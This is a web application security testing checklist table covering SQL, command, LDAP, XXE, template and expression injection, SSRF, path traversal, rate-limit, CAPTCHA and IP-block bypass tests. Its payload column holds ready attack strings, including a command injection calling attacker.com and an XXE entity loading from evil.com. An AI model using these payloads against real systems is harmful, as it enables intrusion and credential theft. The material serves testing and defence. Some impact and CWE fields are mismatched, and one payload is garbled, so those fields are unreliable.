| SEC-037 | SQL Injection in ORDER BY and GROUP BY | Injection (WSTG-INPV-05) | SQL Injection Prevention | 1. Identify sort and order parameters in queries.<br>2. Inject SQL in sort_by or order parameters.<br>3. Test with numeric ORDER BY for column enumeration.<br>4. Test for error-based injection via ORDER BY. | Application must whitelist allowed column names for sorting and ordering and never use user input directly in ORDER BY clauses. | <code>sort=name;(SELECT SLEEP(5));order_by=1,2,3,(SELECT password FROM users);sort=IF(1=1,name,email)</code> | SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks). | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | SQLMap;Burp Suite | CWE-89; [SQLi kit](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings |
| SEC-038 | SQL Injection via JSON Body | Injection (WSTG-INPV-05) | SQL Injection Prevention | 1. Identify JSON API endpoints.<br>2. Inject SQL payloads in JSON string values.<br>3. Test with JSON arrays and nested objects.<br>4. Check for type confusion between string and integer.<br>5. Test with Unicode-encoded SQL. | Application must use parameterized queries for all data from JSON request bodies regardless of the data type. | <code>{"id":"1 OR 1=1",name:"' UNION SELECT password FROM users--"};{"filter":{"$where":"this.password.match(/.&#42;/)"}}</code> | SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks). | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | SQLMap;Burp Suite | CWE-89; [SQLi kit](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings |
| SEC-039 | WAF Bypass for SQL Injection | Injection (WSTG-INPV-05) | SQL Injection Prevention | 1. If WAF is present test WAF bypass techniques.<br>2. Use comments like /&#42;!UNION&#42;/ and /&#42;&#42;/ inline.<br>3. Test case variation like SeLeCt and UnIoN.<br>4. Use URL encoding and double encoding.<br>5. Test with alternative syntax. | Application must implement defense in depth with both WAF and parameterized queries so that even if WAF is bypassed the application is still protected. | <code>/&#42;!50000UNION&#42;/ /&#42;!50000SELECT&#42;/;uNiOn SeLeCt;%55%4e%49%4f%4e;UN/&#42;&#42;/ION SEL/&#42;&#42;/ECT;' or '1'='1' /&#42;;1' /&#42;!50000%55nIoN&#42;/ /&#42;!50000%53telephones&#42;/</code> | SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks). | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | SQLMap;Burp Suite;WAF bypass wordlists | CWE-89; [SQLi kit](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings |
| SEC-040 | Null Byte Injection Testing | Input Validation (WSTG-INPV-01) | Input Sanitization | 1. Inject null bytes in input fields at various positions.<br>2. Test file upload with null bytes in filename.<br>3. Check if null bytes truncate input before validation.<br>4. Test in URL paths and parameters. | Application must reject null bytes in all user input and validate the complete input string without truncation. | <code>filename=test.php%00.jpg;param=valid_input%00&lt;script&gt;alert(1)&lt;/script&gt;;path=/allowed/../%00/restricted</code> | Improper input validation -&gt; downstream injection / logic abuse. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp Suite;Custom Scripts | CWE-20; [XSS kit](#/checklist/xss); OWASP Input Validation Cheat Sheet |
| SEC-041 | Unicode and Encoding Bypass Testing | Input Validation (WSTG-INPV-01) | Input Sanitization | 1. Test with various Unicode representations of dangerous characters.<br>2. Test with overlong UTF-8 sequences.<br>3. Test with fullwidth characters.<br>4. Test with Unicode normalization bypass.<br>5. Test with homoglyph attacks. | Application must normalize Unicode input before validation and reject overlong or malformed encoding sequences. | <code>Use fullwidth ＜script＞ instead of &lt;script&gt;;overlong UTF-8 %c0%af for /;homoglyphs like Ρaypal (Cyrillic Р)</code> | Improper input validation -&gt; downstream injection / logic abuse. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp Suite;Custom Scripts | CWE-20; [XSS kit](#/checklist/xss); OWASP Input Validation Cheat Sheet |
| SEC-042 | Command Injection Testing | Injection (WSTG-INPV-12) | Input Sanitization | 1. Identify fields that may interact with system commands.<br>2. Inject command separators like semicolon and pipe and ampersand.<br>3. Test with backticks and $() command substitution.<br>4. Test ping and nslookup for out-of-band detection. | Application must never pass user input directly to system commands and must use safe APIs or strict input whitelisting. | <code>;cat /etc/passwd;&#124;id;&#96;whoami&#96;;$(id);&amp;&amp; cat /etc/passwd;&#124;&#124; id;%0aid;\nid;input&#96;nslookup attacker.com&#96;</code> | OS command injection -&gt; remote code execution / server takeover. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;Commix;Collaborator | CWE-78; [Command Injection kit](#/checklist/cmdi); PortSwigger OS command injection; GTFOBins |
| SEC-043 | LDAP Injection Testing | Injection (WSTG-INPV-06) | Input Sanitization | 1. Identify fields that may query LDAP directories.<br>2. Inject LDAP filter special characters.<br>3. Test authentication bypass via LDAP injection.<br>4. Test for information disclosure through modified queries. | Application must sanitize LDAP special characters and use parameterized LDAP queries. | <code>username=&#42;;password=&#42;;search=&#42;)(objectClass=&#42;;admin)(&#124;(password=&#42;;input=&#42;)(uid=&#42;))(&#124;(uid=&#42;</code> | LDAP filter injection -&gt; authentication bypass / directory data disclosure. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;Custom Scripts | CWE-90; [LDAP kit](#/checklist/ldap); OWASP LDAP Injection; PayloadsAllTheThings |
| SEC-044 | XML Injection and XXE Testing | Injection (WSTG-INPV-07) | Input Sanitization | 1. Identify XML input processing points.<br>2. Test for XXE with file retrieval payload.<br>3. Test for blind XXE via out-of-band.<br>4. Test for XML entity expansion (billion laughs).<br>5. Test for XInclude injection. | Application must disable external entity processing in all XML parsers and validate XML input against schemas. | <code>&lt;?xml version='1.0'?&gt;&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM 'file:///etc/passwd'&gt;]&gt;&lt;root&gt;&amp;xxe;&lt;/root&gt;;&lt;!ENTITY % xxe SYSTEM 'http://evil.com/xxe.dtd'&gt;</code> | XXE -&gt; local file read / SSRF / OOB exfiltration. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;OWASP ZAP;XXEinjector | CWE-611; [XXE kit](#/checklist/xxe); PortSwigger XXE |
| SEC-045 | Server-Side Template Injection (SSTI) | Injection (WSTG-INPV-18) | Input Sanitization | 1. Identify fields where input is rendered through templates.<br>2. Inject template expressions for common engines.<br>3. Test Jinja2 and Twig and Freemarker and Velocity and Mako.<br>4. Attempt code execution through template injection. | Application must not process user input as template code and must escape all template syntax in user data. | <code>{{7&#42;7}};${7&#42;7};#{7&#42;7};&lt;%= 7&#42;7 %&gt;;{{config}};{{''.__class__.__mro__[1].__subclasses__()}};${T(java.lang.Runtime).getRuntime().exec('id')}</code> | Server-side template injection -&gt; remote code execution on the app server. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;Tplmap;SSTImap | CWE-1336; [SSTI kit](#/checklist/ssti); PortSwigger SSTI (James Kettle) |
| SEC-046 | Path Traversal Testing | Path Traversal (WSTG-INPV-10) | Input Sanitization | 1. Identify file inclusion or file access parameters.<br>2. Test with ../ and ..\ traversal sequences.<br>3. Test with URL-encoded traversal.<br>4. Test with double encoding.<br>5. Test absolute paths.<br>6. Test null byte termination. | Application must validate file paths against a whitelist and canonicalize paths before access to prevent directory traversal. | <code>../../../etc/passwd;....//....//etc/passwd;%2e%2e%2f%2e%2e%2f;..%252f..%252f;/etc/passwd%00.jpg;..%c0%af</code> | Path traversal -&gt; secret/cross-user file read or out-of-dir write -&gt; RCE. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;DotDotPwn;ffuf | CWE-22; [Path Traversal kit](#/checklist/pathtraversal); PortSwigger path traversal; Orange Tsai |
| SEC-047 | HTTP Parameter Pollution Testing | Input Validation (WSTG-INPV-04) | Input Sanitization | 1. Send requests with duplicate parameters.<br>2. Test with same parameter in both GET and POST.<br>3. Check which value the application uses.<br>4. Test for parameter priority conflicts. | Application must handle duplicate parameters consistently and reject ambiguous requests to prevent parameter pollution attacks. | <code>GET /api/action?admin=false&amp;admin=true;POST body user_id=1001&amp;user_id=1002;mix GET and POST with conflicting values</code> | Mass assignment / parameter pollution -&gt; privilege escalation (role/isAdmin/isVerified) or ownership takeover. | Medium | 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N) | Burp Suite;Postman | CWE-915; [IDOR kit](#/checklist/idor); PortSwigger Mass assignment; OWASP API3 BOPLA |
| SEC-048 | CRLF Injection Testing | Injection (WSTG-INPV-15) | Input Sanitization | 1. Inject CRLF characters in input fields.<br>2. Test for HTTP response splitting.<br>3. Test for log injection.<br>4. Check URL redirect parameters for CRLF.<br>5. Test email fields for header injection. | Application must strip or encode CRLF characters from all user input to prevent response splitting and log injection. | <code>input=%0d%0aSet-Cookie:evil=true;url=test%0d%0aHTTP/1.1 200 OK%0d%0a;header=value%0d%0aInjected-Header:evil</code> | CRLF/response-splitting -&gt; header injection, cache poisoning, session fixation. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp Suite;CRLFuzz | CWE-113; [Host Header kit](#/checklist/hostheader); OWASP CRLF Injection; PortSwigger |
| SEC-049 | Server-Side Request Forgery (SSRF) Testing | SSRF (WSTG-INPV-19) | Input Sanitization | 1. Identify parameters that accept URLs.<br>2. Test with internal IP addresses.<br>3. Test with localhost variants.<br>4. Test with cloud metadata URLs.<br>5. Test with DNS rebinding.<br>6. Test with URL scheme variations. | Application must validate all user-provided URLs against an allowlist and block internal network and metadata service access. | <code>url=http://169.254.169.254/latest/meta-data/;url=http://localhost:8080;url=http://127.0.0.1;url=http://[::1];url=http://0x7f000001</code> | SSRF -&gt; internal-service reach / cloud metadata credential theft. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;Collaborator;SSRFMap | CWE-918; [SSRF kit](#/checklist/ssrf); Orange Tsai 'A New Era of SSRF'; PortSwigger |
| SEC-050 | Deserialization Vulnerability Testing | Injection (WSTG-INPV-08) | Input Sanitization | 1. Identify serialized data in requests cookies or parameters.<br>2. Detect serialization format (Java/PHP/.NET/Python).<br>3. Inject malicious serialized objects.<br>4. Test for remote code execution via deserialization. | Application must avoid deserializing untrusted data and implement type checking and integrity verification on serialized objects. | <code>Java serialized object with ysoserial payload;PHP O:8:"autoload":0:{};Python pickle payload;.NET ObjectStateFormatter</code> | Insecure deserialization -&gt; remote code execution. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;ysoserial;PHPGGC;Custom Scripts | CWE-502; [Deserialization kit](#/checklist/deser); Bechler 'Java Unmarshaller Security'; ysoserial |
| SEC-051 | Expression Language Injection | Injection (WSTG-INPV-01) | Input Sanitization | 1. Identify Java EE or Spring applications.<br>2. Test for Expression Language injection in parameters.<br>3. Inject EL expressions like ${} and #{}.<br>4. Test for OGNL injection in Struts applications. | Application must not evaluate user input as expression language and must escape EL syntax in all user data. | <code>${7&#42;7};${applicationScope};#{7&#42;7};%{(#rt=@java.lang.Runtime@getRuntime()).(#rt.exec('id'))}</code> | SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks). | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;Custom Scripts | CWE-89; [SQLi kit](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings |
| SEC-052 | Login Rate Limiting Verification | Authentication (WSTG-ATHN-03) | Rate Limiting | 1. Attempt multiple failed login attempts in rapid succession.<br>2. Count how many attempts are allowed before lockout or throttling.<br>3. Check if rate limiting applies per-user per-IP or both.<br>4. Test with varying credentials. | Application must implement rate limiting on login attempts allowing no more than 5-10 failed attempts before temporary lockout with increasing delays. | <code>Send 50+ POST /api/login with wrong passwords;check at what count rate limiting triggers;verify lockout duration</code> | Missing anti-automation/rate-limit -&gt; brute force, OTP/2FA guessing, resource-flood abuse. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp Suite Intruder;Hydra;Custom Scripts | CWE-799; [Account Takeover kit](#/checklist/ato); OWASP WSTG-ATHN-04; PortSwigger |
| SEC-053 | Rate Limit Bypass via Header Manipulation | Business Logic (WSTG-BUSL-05) | Rate Limiting | 1. Trigger rate limiting.<br>2. Try bypassing with X-Forwarded-For header changes.<br>3. Test with X-Real-IP and X-Originating-IP and X-Client-IP headers.<br>4. Test with True-Client-IP header.<br>5. Rotate IP values. | Application must determine the client's true IP address from the actual network connection and not trust client-provided IP headers for rate limiting. | <code>X-Forwarded-For: 1.2.3.{1-255};X-Real-IP: 10.0.0.{1-255};X-Originating-IP: 192.168.1.{1-255};True-Client-IP: random_IPs</code> | Missing anti-automation/rate-limit -&gt; brute force, OTP/2FA guessing, resource-flood abuse. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp Suite Intruder;Custom Scripts | CWE-799; [Account Takeover kit](#/checklist/ato); OWASP WSTG-ATHN-04; PortSwigger |
| SEC-054 | Rate Limit Bypass via Parameter Variation | Business Logic (WSTG-BUSL-05) | Rate Limiting | 1. Trigger rate limiting on an endpoint.<br>2. Add extra parameters to the request.<br>3. Change parameter order.<br>4. Add whitespace or encoding variations.<br>5. Check if parameter changes reset the rate counter. | Application must implement rate limiting based on the core request identity and not be bypassed by parameter variations. | <code>Add dummy=random to each request;change param order;URL-encode parameters differently;add trailing spaces</code> | Missing anti-automation/rate-limit -&gt; brute force, OTP/2FA guessing, resource-flood abuse. | Medium | 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N) | Burp Suite Intruder;Custom Scripts | CWE-799; [Account Takeover kit](#/checklist/ato); OWASP WSTG-ATHN-04; PortSwigger |
| SEC-055 | API Rate Limiting Assessment | Business Logic (WSTG-BUSL-05) | Rate Limiting | 1. Send rapid requests to API endpoints.<br>2. Measure rate limits on different endpoints.<br>3. Check for consistent rate limiting across all APIs.<br>4. Test with authenticated vs unauthenticated requests.<br>5. Check rate limit response headers. | Application must implement consistent rate limiting across all API endpoints with clear rate limit headers in responses. | <code>Send 100+ requests per second to various endpoints;check X-RateLimit-Limit;X-RateLimit-Remaining;Retry-After headers</code> | Missing anti-automation/rate-limit -&gt; brute force, OTP/2FA guessing, resource-flood abuse. | Medium | 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N) | Burp Suite Intruder;JMeter;vegeta | CWE-799; [Account Takeover kit](#/checklist/ato); OWASP WSTG-ATHN-04; PortSwigger |
| SEC-056 | Rate Limiting on Password Reset | Authentication (WSTG-ATHN-03) | Rate Limiting | 1. Send multiple password reset requests for the same email.<br>2. Check how many resets are allowed per time period.<br>3. Test with different emails rapidly.<br>4. Check for email bombing prevention. | Application must rate limit password reset requests to prevent email bombing and brute force of reset tokens. | <code>Send 100+ POST /api/password-reset with same email;rotate emails at high frequency</code> | Missing anti-automation/rate-limit -&gt; brute force, OTP/2FA guessing, resource-flood abuse. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp Suite Intruder;Custom Scripts | CWE-799; [Account Takeover kit](#/checklist/ato); OWASP WSTG-ATHN-04; PortSwigger |
| SEC-057 | Rate Limiting on Registration | Business Logic (WSTG-BUSL-05) | Rate Limiting | 1. Submit rapid account registration requests.<br>2. Check for rate limiting on the registration endpoint.<br>3. Test with automated registration tools.<br>4. Verify CAPTCHA enforcement after threshold. | Application must rate limit registration requests and implement CAPTCHA to prevent automated mass account creation. | <code>Send 50+ POST /api/register with different email patterns;check for CAPTCHA trigger and rate limiting</code> | Missing anti-automation/rate-limit -&gt; brute force, OTP/2FA guessing, resource-flood abuse. | Medium | 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N) | Burp Suite Intruder;Custom Scripts | CWE-799; [Account Takeover kit](#/checklist/ato); OWASP WSTG-ATHN-04; PortSwigger |
| SEC-058 | Distributed Rate Limit Testing | Business Logic (WSTG-BUSL-05) | Rate Limiting | 1. Send requests from multiple IP addresses simultaneously.<br>2. Check if per-user rate limiting works across IPs.<br>3. Test if total request volume is considered.<br>4. Verify distributed attack detection. | Application must implement per-account rate limiting that works across multiple source IPs and detect distributed attack patterns. | <code>Send requests from 10+ different IPs targeting same account;check if aggregate rate limiting applies</code> | Missing anti-automation/rate-limit -&gt; brute force, OTP/2FA guessing, resource-flood abuse. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Custom Scripts;Cloud Infrastructure;JMeter | CWE-799; [Account Takeover kit](#/checklist/ato); OWASP WSTG-ATHN-04; PortSwigger |
| SEC-059 | Rate Limiting on Sensitive Operations | Business Logic (WSTG-BUSL-05) | Rate Limiting | 1. Test rate limiting on fund transfers.<br>2. Test on payment operations.<br>3. Test on data export functions.<br>4. Test on API key generation.<br>5. Verify rate limits on admin operations. | Application must implement strict rate limiting on all sensitive operations with lower thresholds than general endpoints. | <code>Send rapid POST /api/transfer;POST /api/payments;GET /api/export;POST /api/keys/create requests</code> | Missing anti-automation/rate-limit -&gt; brute force, OTP/2FA guessing, resource-flood abuse. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp Suite Intruder;Postman | CWE-799; [Account Takeover kit](#/checklist/ato); OWASP WSTG-ATHN-04; PortSwigger |
| SEC-060 | Rate Limit Response Information Disclosure | Information Disclosure (WSTG-INFO-05) | Rate Limiting | 1. Trigger rate limiting.<br>2. Examine the rate limit response for information disclosure.<br>3. Check if remaining attempts or reset time reveals sensitive timing.<br>4. Verify error message content. | Rate limit responses must not reveal information that could help attackers optimize their attack such as exact remaining attempts or precise reset timestamps. | <code>Check 429 response for X-RateLimit-Remaining: 0;Retry-After: 30;check if response differs for valid vs invalid users</code> | Missing anti-automation/rate-limit -&gt; brute force, OTP/2FA guessing, resource-flood abuse. | Low | 3.7 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N) | Burp Suite;Postman | CWE-799; [Account Takeover kit](#/checklist/ato); OWASP WSTG-ATHN-04; PortSwigger |
| SEC-061 | CAPTCHA Bypass via Removal | Authentication (WSTG-ATHN-08) | Captcha / reCAPTCHA | 1. Identify forms protected by CAPTCHA.<br>2. Submit the form normally.<br>3. Remove the CAPTCHA parameter from the request entirely.<br>4. Remove the CAPTCHA token/response field.<br>5. Check if the form processes without CAPTCHA. | Application must require and validate CAPTCHA responses server-side and reject submissions where the CAPTCHA parameter is missing. | <code>Remove g-recaptcha-response parameter;remove captcha_token;remove h-captcha-response from POST body</code> | Missing anti-automation/rate-limit -&gt; brute force, OTP/2FA guessing, resource-flood abuse. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp Suite;Postman | CWE-799; [Account Takeover kit](#/checklist/ato); OWASP WSTG-ATHN-04; PortSwigger |
| SEC-062 | CAPTCHA Bypass via Empty Response | Authentication (WSTG-ATHN-08) | Captcha / reCAPTCHA | 1. Submit the form with an empty CAPTCHA response value.<br>2. Submit with captcha=null or captcha=undefined.<br>3. Submit with captcha=0 or captcha=false.<br>4. Check if empty values bypass validation. | Application must reject empty or null CAPTCHA responses and require a valid solved CAPTCHA token. | <code>g-recaptcha-response=;captcha_response=null;captcha=undefined;h-captcha-response=0;captcha=false</code> | Missing anti-automation/rate-limit -&gt; brute force, OTP/2FA guessing, resource-flood abuse. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp Suite;Postman | CWE-799; [Account Takeover kit](#/checklist/ato); OWASP WSTG-ATHN-04; PortSwigger |
| SEC-063 | CAPTCHA Token Reuse | Authentication (WSTG-ATHN-08) | Captcha / reCAPTCHA | 1. Solve a CAPTCHA and capture the valid response token.<br>2. Submit the form successfully.<br>3. Reuse the same CAPTCHA token for subsequent submissions.<br>4. Check if the old token is still accepted. | Application must invalidate CAPTCHA tokens after single use and reject reused tokens for subsequent submissions. | <code>Capture valid g-recaptcha-response token;replay in 10+ subsequent requests;check if each succeeds</code> | Missing anti-automation/rate-limit -&gt; brute force, OTP/2FA guessing, resource-flood abuse. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp Suite;Postman | CWE-799; [Account Takeover kit](#/checklist/ato); OWASP WSTG-ATHN-04; PortSwigger |
| SEC-064 | CAPTCHA Implementation Server-Side Validation | Authentication (WSTG-ATHN-08) | Captcha / reCAPTCHA | 1. Solve CAPTCHA and submit the form.<br>2. Check if validation is done client-side only.<br>3. Intercept and modify the validation response.<br>4. Change validation result from fail to success. | Application must validate CAPTCHA responses server-side by calling the CAPTCHA provider's verification API and not rely on client-side validation. | <code>Intercept CAPTCHA validation response and change {"success":false} to {"success":true};bypass client-side JS validation</code> | Missing anti-automation/rate-limit -&gt; brute force, OTP/2FA guessing, resource-flood abuse. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;Postman | CWE-799; [Account Takeover kit](#/checklist/ato); OWASP WSTG-ATHN-04; PortSwigger |
| SEC-065 | CAPTCHA Secret Key Exposure | Information Disclosure (WSTG-INFO-05) | Captcha / reCAPTCHA | 1. Search client-side code for CAPTCHA secret keys.<br>2. Check for reCAPTCHA secret key exposure.<br>3. Verify that only the site key is in client-side code.<br>4. Check configuration files and source repositories. | Application must keep CAPTCHA secret keys server-side only and never expose them in client-accessible code. | <code>Search source for secret_key=;recaptcha_secret;RECAPTCHA_SECRET_KEY;hcaptcha_secret in JS files and page source</code> | Missing anti-automation/rate-limit -&gt; brute force, OTP/2FA guessing, resource-flood abuse. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Browser DevTools;GitLeaks;TruffleHog | CWE-799; [Account Takeover kit](#/checklist/ato); OWASP WSTG-ATHN-04; PortSwigger |
| SEC-066 | CAPTCHA OCR Bypass Testing | Authentication (WSTG-ATHN-08) | Captcha / reCAPTCHA | 1. If using custom image CAPTCHA test with OCR tools.<br>2. Check CAPTCHA complexity and distortion level.<br>3. Test with automated CAPTCHA solving services.<br>4. Measure solve rate. | Application must use CAPTCHA implementations that are resistant to automated solving including adequate distortion and noise for image-based solutions. | <code>Use Tesseract OCR on CAPTCHA images;test with anti-captcha.com API;test with 2captcha.com service</code> | Missing anti-automation/rate-limit -&gt; brute force, OTP/2FA guessing, resource-flood abuse. | Medium | 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N) | Tesseract OCR;Anti-CAPTCHA;2Captcha;Custom Scripts | CWE-799; [Account Takeover kit](#/checklist/ato); OWASP WSTG-ATHN-04; PortSwigger |
| SEC-067 | CAPTCHA Rate of Presentation | Authentication (WSTG-ATHN-08) | Captcha / reCAPTCHA | 1. Check when CAPTCHA is presented.<br>2. Verify if CAPTCHA appears after a reasonable number of failed attempts.<br>3. Test if CAPTCHA is required on first attempt for critical operations.<br>4. Check for adaptive CAPTCHA. | Application must present CAPTCHA appropriately based on risk assessment and require it from the first attempt on critical operations. | <code>Submit 3-5 failed login attempts and check CAPTCHA trigger;verify CAPTCHA on registration;check adaptive behavior</code> | Missing anti-automation/rate-limit -&gt; brute force, OTP/2FA guessing, resource-flood abuse. | Medium | 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N) | Burp Suite;Manual Testing | CWE-799; [Account Takeover kit](#/checklist/ato); OWASP WSTG-ATHN-04; PortSwigger |
| SEC-068 | CAPTCHA Accessibility Bypass | Authentication (WSTG-ATHN-08) | Captcha / reCAPTCHA | 1. Check for audio CAPTCHA alternative.<br>2. Test if audio CAPTCHA can be solved by speech-to-text.<br>3. Check for CAPTCHA bypass via accessibility features.<br>4. Test fallback mechanisms. | Application must provide accessible CAPTCHA alternatives that maintain security while meeting accessibility requirements. | <code>Use Google Speech-to-Text API on audio CAPTCHA;test accessibility fallback endpoints;check for bypass via assistive modes</code> | Missing anti-automation/rate-limit -&gt; brute force, OTP/2FA guessing, resource-flood abuse. | Medium | 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N) | Speech-to-Text APIs;Manual Testing | CWE-799; [Account Takeover kit](#/checklist/ato); OWASP WSTG-ATHN-04; PortSwigger |
| SEC-069 | IP Block Bypass via Proxy Headers | Broken Access Control (WSTG-AUTHZ-02) | IP Blocking | 1. Get blocked by IP.<br>2. Add X-Forwarded-For header with different IP.<br>3. Test X-Real-IP and X-Originating-IP and X-Client-IP headers.<br>4. Test with True-Client-IP header.<br>5. Check if any header bypasses the block. | Application must determine client IP from the actual network connection not from client-provided HTTP headers for IP blocking decisions. | <code>X-Forwarded-For: 8.8.8.8;X-Real-IP: 1.1.1.1;X-Originating-IP: 127.0.0.1;X-Client-IP: 10.0.0.1;True-Client-IP: random</code> | IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;cURL | CWE-639; [IDOR kit](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA |
| SEC-070 | IP Block Bypass via IPv6 | Broken Access Control (WSTG-AUTHZ-02) | IP Blocking | 1. If blocked on IPv4 try accessing via IPv6.<br>2. Test with IPv6 representations of the same address.<br>3. Check if IPv4-mapped IPv6 addresses bypass blocks.<br>4. Test with IPv6 localhost. | Application must enforce IP blocking consistently across IPv4 and IPv6 addresses and handle IPv4-mapped IPv6 addresses properly. | <code>Access via IPv6 address;use ::ffff:BLOCKED_IP (IPv4-mapped);use ::1 for localhost;use IPv6 shorthand variations</code> | IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | cURL;Browser;nmap | CWE-639; [IDOR kit](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA |
| SEC-071 | IP Block Evasion via Request Routing | Broken Access Control (WSTG-AUTHZ-02) | IP Blocking | 1. If blocked try accessing through different application entry points.<br>2. Test via alternative ports.<br>3. Test via different subdomains.<br>4. Check if CDN IPs are used for block bypass.<br>5. Test via VPN or proxy. | Application must enforce IP blocking at all entry points consistently and not allow bypass through alternative routing. | <code>Access blocked resource via api.target.com vs www.target.com;use port 8080 vs 443;route through CDN</code> | IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | cURL;VPN;Proxy Services | CWE-639; [IDOR kit](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA |
| SEC-072 | IP Whitelist Bypass Testing | Broken Access Control (WSTG-AUTHZ-02) | IP Blocking | 1. Identify IP-whitelisted resources.<br>2. Test for IP spoofing via headers.<br>3. Check for SSRF to access from server IP.<br>4. Test if localhost access bypasses whitelist.<br>5. Check for DNS rebinding bypass. | Application must validate IP whitelists using actual connection source and not be bypassable through header manipulation or SSRF. | <code>Use SSRF to access whitelist-protected resources from server IP;spoof whitelisted IP via X-Forwarded-For</code> | IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;SSRFMap;Custom Scripts | CWE-639; [IDOR kit](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA |
| SEC-073 | IP Block Persistence and Timeout | Business Logic (WSTG-BUSL-05) | IP Blocking | 1. Trigger IP blocking.<br>2. Wait and test at various intervals.<br>3. Check if the block is permanent or temporary.<br>4. Verify the block timeout period.<br>5. Test if blocks reset properly. | Application must implement appropriate block durations with automatic unblocking and provide clear communication about block status. | <code>Trigger IP block then test at 5m;15m;30m;1h;24h intervals to determine block duration and reset behavior</code> | Business-logic flaw in this flow -&gt; control bypass with security or financial impact. | Low | 3.7 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N) | Burp Suite;Custom Scripts | CWE-840; PortSwigger Business logic |
